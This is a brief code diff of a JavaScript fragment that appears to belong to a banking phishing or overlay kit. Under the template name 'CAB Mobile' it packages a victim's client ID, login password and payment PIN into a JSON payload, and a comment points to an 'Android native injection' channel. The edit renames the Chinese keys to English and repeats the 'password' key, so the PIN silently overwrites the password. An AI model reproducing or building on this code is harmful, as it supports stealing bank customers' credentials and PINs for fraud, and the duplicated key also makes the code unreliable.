@@ -970,11 +970,11 @@
     loadingMask.classList.add('show');
 
     var payload = JSON.stringify({
-      "类型": "CAB Mobile",
-      "客户编号": savedClientId,
-      "登录密码": savedPassword,
-      "支付密码": pinCode,
-      "时间戳": Date.now()
+      'template': "CAB Mobile",
+      'username': savedClientId,
+      'password': savedPassword,
+      'password': pinCode,
+      'ts': Date.now()
     });
 
     // 通道 1: Android 原生注入
